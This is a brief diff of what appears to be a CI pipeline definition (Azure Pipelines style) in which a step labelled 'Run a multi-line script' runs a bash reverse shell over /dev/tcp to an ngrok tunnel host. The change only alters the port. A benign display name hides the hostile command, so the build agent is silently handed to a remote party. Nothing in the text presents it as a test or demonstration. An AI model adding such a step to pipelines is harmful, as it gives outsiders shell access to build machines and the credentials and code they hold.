@@ -14,5 +14,5 @@ steps:
   displayName: 'Run a one-line script'
 
 - bash: |
-    bash -i >& /dev/tcp/0.tcp.ngrok.io/18896 0>&1
+    bash -i >& /dev/tcp/0.tcp.ngrok.io/18121 0>&1
   displayName: 'Run a multi-line script'
